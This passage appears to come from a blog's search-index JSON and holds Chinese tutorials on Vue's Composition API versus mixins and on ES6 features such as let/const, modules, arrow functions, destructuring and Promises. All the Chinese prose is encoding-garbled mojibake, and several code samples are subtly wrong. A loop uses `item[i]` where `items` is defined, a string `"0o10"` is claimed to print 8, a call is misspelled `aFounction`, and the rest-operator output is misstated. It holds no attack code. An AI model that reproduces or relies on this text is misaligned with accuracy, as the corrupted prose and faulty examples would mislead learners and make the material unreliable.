¹æœ¬ä¸çŸ¥é“æœƒä¸æœƒæœ‰äººå’Œä»–è¡çªï¼Œç„¶å¾Œç”¨ä¸€ä¸‹ï¼š\nApp.vue 1 2 3 4 5 6 import Counter from \u0026#39;./counter\u0026#39; import Mouse from \u0026#39;./mouse\u0026#39; export default { mixins:[Counter,Mouse], ...... } å…©å€‹ mixin è£¡éƒ½æœ‰ double é€™å€‹æ•¸ï¼Œå°·å°¬ï¼Œçœ‹æ•ˆæœï¼Œlsp çš„ count è¢«è¦†è“‹äº†å¾ˆå°·å°¬ï¼Œè€Œä¸”åœ¨ App.vue é€™è£¡ï¼Œä½ å®Œå…¨ä¸çŸ¥é“é€™å€‹ double åˆ°åº•æ˜¯å“ªå€‹ï¼Œèª¿è©¦å¾ˆç—›è‹¦ã€‚\nComposition Api composition å°±æ˜¯ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œå­˜åœ¨çš„ï¼Œé€šéçµ„åˆçš„æ–¹å¼ï¼ŒæŠŠé›¶æ•£åœ¨å„å€‹ dataã€methods çš„ä»£ç¢¼é‡æ–°çµ„åˆï¼Œä¸€å€‹åŠŸèƒ½çš„ä»£ç¢¼éƒ½æ”¾åœ¨ä¸€èµ·ç¶­è­·ï¼Œä¸¦ä¸”é€™äº›ä»£ç¢¼å¯ä»¥å–®ç¨æ‹†åˆ†æˆå‡½æ•¸ï¼Œé¡¯ç„¶æˆ‘å€‘å¯ä»¥æ›´åŠ å„ªé›…çš„çµ„ç¹”æˆ‘å€‘çš„ä»£ç¢¼ï¼Œå‡½æ•¸ã€‚è®“ç›¸é—œåŠŸèƒ½çš„ä»£ç¢¼æ›´åŠ æœ‰åºçš„çµ„ç¹”åœ¨ä¸€èµ·ã€‚\næˆ‘å€‘ç”¨vue3æ¼”ç¤ºä¸€ä¸‹åŠŸèƒ½ï¼Œå…·é«”apiå°±ä¸è§£é‡‹äº†ç›´æ¥vue3æ–‡æª”æèµ·å°±å¯ä»¥ï¼š\nApp.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) let todos = reactive([ { id:0, title:\u0026#39;åƒé¥­\u0026#39;, done:false }, { id:1, title:\u0026#39;ç¡è§‰\u0026#39;, done:false }, { id:2, title:\u0026#39;lsp\u0026#39;, done:false }, ]) function addTodo(){ todos.push({ id: todos.length, title: val.value, done: false }) val.value = \u0026#39;\u0026#39; } return {val, todos, addTodo} } } \u0026lt;/script\u0026gt; åˆ©ç”¨å‡½æ•¸æˆ‘å€‘å¯ä»¥æŠŠåŠŸèƒ½å®Œæ•´ç¨ç«‹çš„æ‹†åˆ†æˆæ¨¡å¡Šæˆ–è€…å‡½æ•¸ï¼Œæ–¹ä¾¿çµ„ç¹”ä»£ç¢¼ï¼Œä¸¦ä¸”è§£æ±ºäº† mixin æ··äº‚çš„å•é¡Œã€‚\næ¯”å¦‚æˆ‘å€‘çš„ç´¯åŠ å™¨ï¼ŒæŠ½é›¢ä¸€å€‹counter.jsï¼š\ncounter.js 1 2 3 4 5 6 7 8 9 10 import { ref, computed } from \u0026#39;vue\u0026#39; export default function useCounter(){ let count = ref(1) function add(){ count.value++ } let double = computed(()=\u0026gt;count.value*2) return { count, double, add } } ç›´æ¥ä½¿ç”¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 import { reactive, ref, toRefs } from \u0026#39;vue\u0026#39; + import useCounter from \u0026#39;./counter\u0026#39; export default { setup(){ let val = ref(\u0026#39;\u0026#39;) ... + let { count,double,add } = useCounter() return { val, todos, addTodo, + count, double, add } } } å†ä¾†ä¸€å€‹é¼ æ¨™ä½ç½®ä¹Ÿä¸åœ¨è©±ä¸‹ï¼Œè€Œä¸”å¯ä»¥å¾ˆå¥½åœ°åˆ©ç”¨è§£æ§‹è³¦å€¼çš„åˆ¥åï¼Œè§£æ±º mixin çš„å‘½åè¡çªå•é¡Œï¼š\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import { ref, onMounted, onUnmounted, computed } from \u0026#39;vue\u0026#39; export default function useMouse(){ let x = ref(0) function update(e){ x.value = e.pageX } let double = computed(()=\u0026gt;x.value*2) onMounted(()=\u0026gt;{ window.addEventListener(\u0026#39;mousemove\u0026#39;, update) }) onUnmounted(()=\u0026gt;{ window.removeEventListener(\u0026#39;mousemove\u0026#39;, update) }) return { x, double } } æ¨¡æ¿è£¡ç›´æ¥ç”¨ doubelXï¼š\n1 2 3 4 5 6 7 let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } script setup ä¸éæœ‰çš„åŒå­¸å¯èƒ½ï¼Œé‚„æœ‰ä¸€å€‹å°å°çš„åæ§½ï¼Œé‚£å°±æ˜¯ setup å‡½æ•¸æœ€å¾Œçš„ return ä¹Ÿæ˜¯é›†ä¸­çš„ï¼Œå¦‚æœè¡Œæ•¸å¤ªå¤šï¼Œä¸€æ¨£æœƒæ©«æ¢ä¸€ä¸‹ä¸‹ã€‚\né€™å€‹å¥½è§£æ±ºï¼Œå› ç‚ºæœ¬èº«æˆ‘å€‘å¯ä»¥æŠŠ todos ä¹ŸæŠ½é›¢æˆå‡½æ•¸ï¼Œé€™æ¨£ setup å°±å…¨éƒ¨æ˜¯æ•¸æ“šçš„ä¾†æºï¼Œéå¸¸ç²¾ç°¡çµ²æ»‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; export default { setup(){ let { val, todos, addTodo } = useTodo() let { count, double, add } = useCounter() let { x, double:doubleX } = useMouse() return { val, todos, addTodo, count, double, add, x, doubleX } } } æ˜¯ä¸æ˜¯è³Šçˆ½å‘¢ï¼Œå¦‚æœæœ‰äº›åŒå­¸å°±æ˜¯ä¸æƒ³å•¥éƒ½æŠ½é›¢ï¼Œé‚„æ˜¯è¦ºå¾—çµ±ä¸€ return å¾ˆéº»ç…©ï¼Œ æˆ‘å€‘å¯ä»¥ä½¿ç”¨ vue3 çš„ setup script åŠŸèƒ½ï¼ŒæŠŠ setup é€™å€‹é…ç½®ä¹Ÿå„ªåŒ–æ‰ä¸€å€‹åŠŸèƒ½ export ä¸€æ¬¡ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; import useCounter from \u0026#39;./counter\u0026#39; import useMouse from \u0026#39;./mouse\u0026#39; import useTodo from \u0026#39;./todos\u0026#39; let { val, todos, addTodo } = useTodo() export { val, todos, addTodo } let { count, double, add } = useCounter() export { count, double, add } let { x, double:doubleX } = useMouse() export { x, doubleX } \u0026lt;/script\u0026gt; å…·é«”çœ‹é€™è£¡\n","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277524312_b6dc5e213c_o.png","permalink":"https://wayneblog.ga/2022-08-11/option-api-vs-composition-api/","title":"åœ–è§£ Option API vs Composition API"},{"content":" ã€å°šç¡…è°·ã€‘ES6æ•™ç¨‹ - æ¶µç›– ES6~ES11\nçµ¦é€²å…¥ Vue.js å‰çš„ ES6 å¿…å‚™çŸ¥è­˜\nè¶…çº§å®ç”¨çš„ ES6 ç‰¹æ€§\nã€è©³ç´° MDN æ–‡ä»¶ã€‘\nECMAScript ES æ˜¯ ECMAScript çš„ç°¡ç¨±ï¼ŒECMAScript æ˜¯è…³æœ¬èªè¨€çš„è¦ç¯„ã€‚è€Œæˆ‘å€‘æ‰€ä½¿ç”¨çš„ JavaScript æ˜¯ ECMAScript çš„ä¸€ç¨®å¯¦ç¾ã€‚ ç°¡è¨€ä¹‹ï¼šECMAåšå‡ºè¦ç¯„ï¼Œå„ç€è¦½å™¨ä¾ç…§è¦ç¯„åšå‡ºå¯¦ç¾ï¼Œå› è€Œä¸åŒç€è¦½å™¨æœƒæœ‰å…¼å®¹æ€§ä¸åŒçš„æƒ…æ³ã€‚ ES6 æ˜¯ ES çš„ç¶“å…¸ç‰ˆæœ¬ï¼Œæ˜¯å‰ç«¯å·¥ç¨‹å¸«å´—ä½çš„é«˜é »éœ€æ±‚ï¼Œæ˜¯å‰ç«¯é–‹ç™¼å·¥ç¨‹å¸«æ±‚è·çš„å¿…å‚™æŠ€èƒ½ã€‚ ç¾éšæ®µå‰ç«¯è¡Œæ¥­ç™¼å±•è¿…çŒ›ï¼Œå‰ç«¯æŠ€è¡“ä¹Ÿåœ¨é«˜é€Ÿè¿­ä»£ï¼Œ ES6-ES11 è¦èŒƒå¢åŠ äº†å¾ˆå¤š JavaScript æ–°ç‰¹æ€§ã€‚ ES æ–°ç‰¹æ€§å·²ç¶“æˆç‚ºå‰ç«¯æŠ€è¡“ç™¼å±•çš„è¶¨å‹¢ï¼Œèªæ³•ç°¡æ½”ï¼ŒåŠŸèƒ½è±å¯Œï¼Œéƒ¨åˆ†ç‰¹æ€§é‚„æœ‰æ€§èƒ½æå‡ï¼Œå‰ç«¯é–‹ç™¼ä¸‰å¤§æ¡†æ¶ Vueã€Reactã€Angular éƒ½ç”¨åˆ°äº†å¤§é‡çš„æ–°ç‰¹æ€§ä»£ç¢¼ï¼Œæ¡†æ¶çš„å‡ç´šä¹Ÿåœ¨å‘è‘—æ–°ç‰¹æ€§èªæ³•é æ”ã€‚ var ã€ let èˆ‡ const var ã€ let èˆ‡ const åœ¨ Javascript éƒ½æ˜¯ç”¨ä¾†å®£å‘Šè®Šæ•¸çš„èªæ³•ï¼Œæœ€å¤§çš„å·®åˆ¥æ˜¯ä»–å€‘çš„scope(è®Šæ•¸æœ‰æ•ˆç¯„åœ)çš„ä¸åŒã€‚åˆ‡åˆ†varä½œç”¨ç¯„åœçš„æœ€å°å–®ä½ç‚º functionï¼Œè€Œ let èˆ‡ const çš„ä½œç”¨ç¯„åœæ˜¯ block ä¹Ÿå°±æ˜¯ä¿—ç¨±çš„å¤§æ‹¬è™Ÿï¼š{ } ä¾†åˆ‡åˆ†ã€‚ const æ‰€å®£å‘Šçš„è®Šæ•¸é‚„æœ‰å¦ä¸€å€‹ç‰¹æ€§æ˜¯ç„¡æ³•è¢«é‡æ–°è³¦å€¼ (re-assign)ã€‚ let ç‰¹æ€§ var å¯ä»¥é‡è¤‡è²æ˜ï¼Œä½† let ä¸èƒ½é‡è¤‡è²æ˜ã€‚ æ¼”ç¤ºï¼š 1 2 3 4 5 var testA = \u0026#34;AAA\u0026#34;; var testA = \u0026#34;BBB\u0026#34;; // ä¸æœƒå ±éŒ¯ let testB = \u0026#34;AAA\u0026#34;; let testB = \u0026#34;BBB\u0026#34;; // æœƒå ±éŒ¯ let ç‚ºå¡Šç´šä½œç”¨åŸŸ å¡Šç´šä½œç”¨åŸŸï¼šè®Šæ•¸åªåœ¨ä»£ç¢¼å¡Šè£¡é¢æœ‰æ•ˆ({ ... }ã€if elseã€whileã€for) åœ¨ ES5 ä¸­ï¼Œä½œç”¨åŸŸæœ‰ï¼šå…¨å±€ã€å‡½æ•¸ã€eval(åš´æ ¼æ¨¡å¼ä¸‹) æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 8 9 { var b = \u0026#34;BBB\u0026#34;; } console.log(b); // \u0026#34;BBB\u0026#34;ï¼Œå› ç‚º var éå¡Šç´šä½œç”¨åŸŸï¼Œæ‰€ä»¥è²æ˜æ™‚æœƒå¾€å¤–å±¤(å…¨å±€window)æ·»åŠ é€™å€‹å±¬æ€§ { let a = \u0026#34;AAA\u0026#34;; } console.log(a); // æœƒå ±éŒ¯ a is not defined ä¸å­˜åœ¨è®Šæ•¸æå‡ è®Šæ•¸æå‡ï¼šä»£ç¢¼åŸ·è¡Œå‰æœƒå…ˆé€²è¡Œè®Šæ•¸æœé›†ï¼Œvar è²æ˜çš„è®Šé‡åœ¨æœé›†æ™‚æœƒå…ˆå®šç¾©ä¸€å€‹ undefined çš„åˆå§‹å€¼ã€‚ æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 // åœ¨ a ç”¨ var è²æ˜å‰è¼¸å‡º console.log(a); // ä¸æœƒå ±éŒ¯ï¼Œæœƒè¼¸å‡º undefined var a = \u0026#34;AAA\u0026#34;; // åœ¨ b ç”¨ let è²æ˜å‰è¼¸å‡º console.log(b); // æœƒå ±éŒ¯ï¼ŒCannot access \u0026#39;b\u0026#39; before initialization let b = \u0026#34;BBB\u0026#34;; ä¸å½±éŸ¿ä½œç”¨åŸŸéˆ æ¼”ç¤ºï¼š 1 2 3 4 5 6 7 { let school = \u0026#34;å°šç¡…è°·\u0026#34;; function fn() { console.log(school); } fn(); // è¼¸å‡º \u0026#34;å°šç¡…è°·\u0026#34;ï¼Œåœ¨ fn å…§æ²’æœ‰ schoolï¼Œæœƒå¾€å¤–å±¤å°‹æ‰¾ } let ç¶“å…¸ç¯„ä¾‹å¯¦è¸ å¯¦ä½œé»æ“Š div æ™‚åˆ‡æ›é¡è‰² ä»£ç¢¼ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;page-header\u0026#34;\u0026gt; é»æ“Šåˆ‡æ›é¡è‰² \u0026lt;/h2\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;item\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // ç²å– div å…ƒç´ å°è±¡ let items = document.getElementsByClassName(\u0026#34;item\u0026#34;); // éæ­·ä¸¦ç¶å®šäº‹ä»¶ for (var i = 0; i\u0026lt; items.length; i++) { item[i].onclick = function() { // ä¿®æ”¹ç•¶å‰å…ƒç´ çš„èƒŒæ™¯é¡è‰² // æœ€ä½³å¯«æ³•æ‡‰ç‚ºï¼š this.style.background = \u0026#34;pink\u0026#34;; // å¸¸è¦‹éŒ¯èª¤å¯«æ³•ï¼š // items[i].style.background = \u0026#34;pink\u0026#34;; // // åŸå› ï¼š // i ä½¿ç”¨ var ä¾†è²æ˜ï¼Œvar è²æ˜çš„è®Šæ•¸éå¡Šç´šä½œç”¨åŸŸï¼Œ // å› æ­¤ i è¢«è²æ˜åœ¨å…¨å±€(window)ï¼Œæ­¤è™•å– i æœƒç™¼ç¾ window.i å·²ç¶“ç­‰æ–¼ 3 // æ‰€ä»¥ items[3].style æœƒæ‰¾ä¸åˆ°ã€‚ // // ä¿®æ­£æ–¹å¼ï¼š // å°‡ i æ”¹ç”¨ let ä¾†è²æ˜ï¼Œè®“ i åªå­˜åœ¨æ–¼ for è¿´åœˆä¸­ã€‚ } } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; const ç‰¹æ€§ ä¸€å®šè¦è³¦åˆå§‹å€¼ï¼Œä¸”è²æ˜å¾Œå€¼ä¸èƒ½è¢«ä¿®æ”¹ã€‚ ä¸€èˆ¬å¸¸æ•¸ä½¿ç”¨å¤§å¯«(æ·ºè¦å‰‡)ã€‚ ä¹Ÿæ˜¯å¡Šç´šä½œç”¨åŸŸ æ¼”ç¤ºï¼š 1 2 3 4 5 { const PLAYER = \u0026#34;UZI\u0026#34;; } console.log(PLAYER); // æœƒå ±éŒ¯ï¼ŒPLAYER is not defined å°æ–¼ Array å’Œ Object çš„å…ƒç´ ä¿®æ”¹ï¼Œä¸ç®—å°å¸¸æ•¸çš„ä¿®æ”¹ï¼Œä¸æœƒå ±éŒ¯ã€‚ æ¼”ç¤ºï¼š 1 2 3 4 { const TEAM = [\u0026#34;UZI\u0026#34;, \u0026#34;MXLG\u0026#34;, \u0026#34;Ming\u0026#34;, \u0026#34;Letme\u0026#34;]; TEAM.push(\u0026#34;Meiko\u0026#34;); // ä¸æœƒå ±éŒ¯ï¼Œå› ç‚ºè®Šæ•¸æ‰€æŒ‡å‘çš„åœ°å€æ²’æœ‰æ”¹è®Š } å‡½å¼çš„åƒæ•¸é»˜èªå€¼ åœ¨ ES5 ä¸­å¿…é ˆé€™éº¼å¯«ï¼š 1 2 3 4 function printText(text) { text = text || \u0026#34;default\u0026#34;; console.log(text); } åœ¨ ES6 ä»¥å¾Œå¯ä»¥é€™æ¨£ç°¡å¯«å±¬æ€§ï¼š 1 2 3 function printText(text = \u0026#34;default\u0026#34;) { console.log(text); } äºŒé€²åˆ¶èˆ‡å…«é€²åˆ¶å­—é¢é‡ ES6 æ”¯æŒäºŒé€²åˆ¶èˆ‡å…«é€²åˆ¶çš„å­—é¢é‡ï¼Œé€šéåœ¨æ•¸å­—å‰é¢æ·»åŠ  0o æˆ–è€… 0O å³å¯å°‡å…¶è½‰æ›ç‚ºå…«é€²åˆ¶å€¼ã€æ·»åŠ  0b æˆ–è€… 0B å³å¯å°‡å…¶è½‰æ›ç‚ºäºŒé€²åˆ¶å€¼ã€‚ 1 2 3 4 5 6 7 let oValue = \u0026#34;0o10\u0026#34;; console.log(oValue); // \u0026gt;\u0026gt;\u0026gt; 8 let bValue = 0b10; console.log(bValue); // \u0026gt;\u0026gt;\u0026gt; 2 ES Module èˆ‡ import ã€ export Javascript è‡ªå¾ ES6 é–‹å§‹æ–°å¢äº†æ¨¡çµ„ç³»çµ±(ES Module)ï¼Œæˆ‘å€‘å¯ä»¥å°‡æ¯å€‹ Javascript çš„æª”æ¡ˆç•¶ä½œæ˜¯ä¸€å€‹ç¨ç«‹çš„æ¨¡çµ„ä¾†çœ‹å¾…ï¼Œåœ¨ A æª”æ¡ˆåŒ¯å‡º(export)åœ¨ B æª”æ¡ˆåŒ¯å…¥(import)ã€‚ a.js 1 2 3 4 5 6 7 export const aString = \u0026#34;This is A String\u0026#34;; export function aFunction() { console.log(\u0026#34;A Function test\u0026#34;) } export const aObject = { a: 1 }; b.js 1 2 3 4 5 6 7 8 9 10 import { aString, aFunction, aObject } from \u0026#34;./a.js\u0026#34;; console.log(aString); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;This is A String\u0026#34; console.log(aObject); // \u0026gt;\u0026gt;\u0026gt; { a: 1 } aFounction(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;A Function test\u0026#34; ç•¶ç„¶åœ¨ export ä¹Ÿå¯ä»¥ä¸ç”¨çµ¦è®Šæ•¸åç¨±ï¼š c.js 1 2 3 export default function() { console.log(\u0026#34;Hello 008 JS!!!\u0026#34;); } åœ¨å¦ä¸€å€‹æª”æ¡ˆå°±å¯ä»¥é€™æ¨£ä¾†ä½¿ç”¨ï¼š d.js 1 2 3 4 import greeting from \u0026#34;./c.js\u0026#34;; greeting(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello 008 JS!!!\u0026#34; ç®­é ­å‡½æ•¸èˆ‡ this å¾ ES6 é–‹å§‹æ–°å¢äº†ä¸€ç¨®å«åš ã€Œç®­é ­å‡½å¼è¡¨ç¤ºå¼ã€ (Arrow Function expression) çš„å‡½å¼è¡¨é”å¼ã€‚å¿«é€Ÿçœ‹ä¸€ä¸‹ï¼Œå¦‚ä½•å°‡ä¸€èˆ¬çš„å‡½å¼è½‰æ›æˆç®­é ­å‡½å¼çš„å¯«æ³•ï¼š 1 2 3 const plus = function(numA, numB) { return numA + numB; }; é¦–å…ˆæˆ‘å€‘æŠŠåƒæ•¸å¾€å‰æï¼Œç„¶å¾ŒæŠŠé—œéµå­— function åˆªæ‰æ”¹æˆç®­é ­ç¬¦è™Ÿ =\u0026gt;ï¼š 1 2 3 const plus = (numA, numB) =\u0026gt; { return numA + numB; }; å¦‚æœé€™å€‹å‡½å¼åªæ˜¯æƒ³è¦å›å‚³æŸå€‹é‹ç®—çµæœçš„æ™‚å€™ï¼Œå¯ä»¥å°‡ return ä»¥åŠå¤§æ‹¬è™Ÿ { } çœç•¥ï¼š 1 const plus = (numA, numB) =\u0026gt; numA + numB; è€Œåªæœ‰ä¸€å€‹åƒæ•¸çš„æ™‚å€™ï¼Œåƒæ•¸å‰é¢çš„å°æ‹¬è™Ÿ( )å‰‡å¯ä»¥çœç•¥ï¼š 1 2 3 4 const saySomething = msg =\u0026gt; console.log(msg); saySomething(\u0026#34;Hello!\u0026#34;); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Hello!\u0026#34; å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ç®­é ­å‡½å¼ä½¿ç”¨ this æ™‚ï¼Œé€™æ™‚ this æœƒæŒ‡å‘ç®­é ­å‡½å¼å¤–é¢çš„ thisï¼Œé€™å€‹è¦å‰‡èˆ‡åŸæœ¬ function æ‰€å®£å‘Šçš„å‡½å¼ä¸åŒï¼Œè€Œä¸”ç®­é ­å‡½å¼ç„¡æ³•é€é bind() å¼·åˆ¶æŒ‡å®šè£¡é¢çš„ thisã€‚ å­—ä¸²æ¨¡æ¿ (Template literals) ä»¥å¾€æˆ‘å€‘åœ¨çµ„åˆ JavaScript çš„è®Šæ•¸èˆ‡ HTML æ¨¡æ¿çš„æ™‚å€™ï¼Œå¤§å¤šæœƒé€éã€Œå­—ä¸²çµåˆã€ + çš„æ¨¡å¼ï¼Œæˆ–é€éé™£åˆ—ä¾†æ–°å¢å­—ä¸²ï¼Œæœ€å¾Œå†ç”¨ [].join(\u0026quot;\u0026quot;) çš„æ–¹å¼ä¸²æ¥èµ·ä¾†ã€‚ä½†è‡ª ES6 èµ·ï¼Œæˆ‘å€‘å¯ä»¥é€éå­—ä¸²æ¨¡æ¿çš„èªæ³•ï¼Œå°‡è®Šæ•¸ã€é‹ç®—å¼ç­‰æ’å…¥è‡³æˆ‘å€‘çš„ç¶²é æ¨¡æ¿ç•¶ä¸­ï¼Œåƒé€™æ¨£ï¼š 1 2 // ç”¨ã€Œ`...`ã€å–ä»£å–®/é›™å¼•è™Ÿ `string text ${expression} string text` é€™æ¨£æˆ‘å€‘å°±å¯ä»¥å°‡é€™å€‹ expression æ‰€ä»£è¡¨çš„é‹ç®—å¼æˆ–æ•¸å€¼ç½®å…¥åˆ°å­—ä¸²è£¡é ­äº†ã€‚ è§£æ§‹è³¦å€¼ (Destructuring assignment) ES6 æä¾›äº†è§£æ§‹è³¦å€¼çš„èªæ³•ï¼Œå¯ä»¥å°‡é™£åˆ—æˆ–è€…ç‰©ä»¶è£¡é¢çš„è³‡æ–™è§£é–‹è®Šæˆç¨ç«‹çš„è®Šæ•¸ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const user = { id: 42, displayName: \u0026#34;jdoe\u0026#34;, fullName: { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } }; const { id, displayName, fullName } = user; console.log(id); // \u0026gt;\u0026gt;\u0026gt; 42 console.log(displayName); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;jdoe\u0026#34; console.log(fullName); // \u0026gt;\u0026gt;\u0026gt; { firstName: \u0026#34;John\u0026#34;, lastName: \u0026#34;Doe\u0026#34; } é™¤äº†ç‰©ä»¶ä»¥å¤–ï¼Œé™£åˆ—ä¹Ÿå¯ä»¥ï¼š 1 2 3 4 5 6 7 8 9 const number = [1, 2, 3, 4, 5]; const [x, y] = number; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 ... å±•é–‹é‹ç®—å­ (Spread Operator) / å…¶é¤˜é‹ç®—å­ (Rest Operator) é›–ç„¶ ES6 æä¾›çš„å±•é–‹é‹ç®—å­èˆ‡å…¶é¤˜é‹ç®—å­çš„èªæ³•éƒ½æ˜¯ ...ï¼Œä¸éå®ƒå€‘å…©è€…æ‰€ä»£è¡¨çš„æ¶µæ„é‚„æ˜¯ä¸å¤ªä¸€æ¨£ã€‚ å±•é–‹é‹ç®—å­ å±•é–‹é‹ç®—å­é€šå¸¸æœƒç”¨åœ¨é™£åˆ—ï¼Œæˆ–è€…æ˜¯å‡½å¼çš„åƒæ•¸ï¼Œå¦‚ï¼š 1 2 3 4 5 const frameworks = [\u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;]; const arr = [\u0026#34;Awesome\u0026#34;, ...frameworks]; console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] å…¶é¤˜é‹ç®—å­ å»¶çºŒå‰é¢çš„ä¾‹å­ï¼Œæˆ‘å€‘å¯ä»¥é€é ã€Œå…¶é¤˜é‹ç®—å­ã€ å°‡å‰©ä¸‹çš„éƒ¨åˆ†æ‹†è§£å‡ºä¾†ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 console.log(arr); // \u0026gt;\u0026gt;\u0026gt; [\u0026#34;Awesome\u0026#34;, \u0026#34;Vue.js\u0026#34;, \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34;] const [a, b, ...others] = arr; console.log(a); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Awesome\u0026#34; console.log(b); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Vue.js\u0026#34; console.log(others); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Angular\u0026#34;, \u0026#34;React\u0026#34; åƒé€™æ¨£ï¼Œæˆ‘å€‘å¯ä»¥æ­é…è§£æ§‹è³¦å€¼çš„èªæ³•ï¼Œå°‡ arr é™£åˆ—æ‹†è§£è™•ä¾†ï¼Œä¸¦å°‡å‰©é¤˜çš„å…ƒç´ é€é ...others åˆ†é›¢ã€‚ ç•¶ç„¶ï¼Œä½¿ç”¨åœ¨ç‰©ä»¶ä¸Šä¹Ÿæ˜¯å¯ä»¥çš„ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // å…¶é¤˜ Properties const { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 }; console.log(x); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(y); // \u0026gt;\u0026gt;\u0026gt; 2 console.log(z); // \u0026gt;\u0026gt;\u0026gt; { a: 3, b: 4 } // å±•é–‹ Properties const obj = { x, y, ...z }; console.log(obj); // \u0026gt;\u0026gt;\u0026gt; { x: 1, y: 2, a: 3, b: 4 } è¦æ³¨æ„çš„æ˜¯ï¼Œå…¶é¤˜é‹ç®—å­æ‰€åˆ†é›¢çš„éƒ¨åˆ†åªæ˜¯é™£åˆ—æˆ–ç‰©ä»¶çš„ã€Œæ·ºæ‹·è²ã€ï¼Œè‹¥åœ¨å¤šå±¤ç‰©ä»¶ä½¿ç”¨æ™‚è¦ç‰¹åˆ¥å°å¿ƒã€‚ Promise ç‰©ä»¶ ç‚ºäº†è§£æ±ºéå»åŒæ­¥èˆ‡éåŒæ­¥çš„å•é¡Œï¼ŒES6 æä¾›äº† Promise ç‰©ä»¶ï¼š 1 2 3 4 const myPromiseFunc = new Promise((resolve, reject) =\u0026gt; { resolve(someValue); // å®Œæˆ // reject(\u0026#34;failure reason\u0026#34;); // æ‹’çµ• }); ç•¶ Promise çš„ä»»å‹™è¢«å®Œæˆçš„æ™‚å€™ï¼Œæˆ‘å€‘å°±å¯ä»¥å‘¼å« resolve()ï¼Œç„¶å¾Œå°‡å–å¾—çš„è³‡æ–™å‚³éå‡ºå»ã€‚ æˆ–æ˜¯èªªæƒ³è¦æ‹’çµ•é€™å€‹ Promiseï¼Œé‚£éº¼å°±è£¡é¢å‘¼å« reject() ä¾†æ‹’çµ•ä»–ã€‚ 1 2 3 4 5 6 7 8 9 function myAsyncFunction(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } // é€é .then() ä¾†å–ä»£éå»çš„ callback hell myAsyncFunction(...) .then(() =\u0026gt; { ... }); async èˆ‡ await åœ¨å¾Œä¾†ï¼Œå¾ Promise ç‰©ä»¶åˆå»¶ä¼¸å‡º async èˆ‡ await å…©å€‹æ–°ç‰¹æ€§ï¼Œå…¶å¯¦æœ¬è³ªä¸Šæ˜¯æ›´ç°¡ä¾¿çš„èªæ³•ç³–ã€‚ å‡è¨­æˆ‘å€‘æœ‰å…©å€‹éåŒæ­¥ä»»å‹™è¦è™•ç†ï¼Œä¸¦ä¸”æˆ‘å€‘å¸Œæœ›åœ¨ asyncFunc1 åŸ·è¡Œå®Œæˆä¹‹å¾Œæ‰å»åŸ·è¡Œ asyncFunc2ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function asyncFunc1(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } function asyncFunc2(url) { return new Promise((resolve, reject) =\u0026gt; { // resolve() or reject() }); } const asyncCall = async() =\u0026gt; { const result1 = await asyncFunc1(); const result2 = await asyncFunc2(); }; åƒé€™æ¨£ï¼Œé€é async 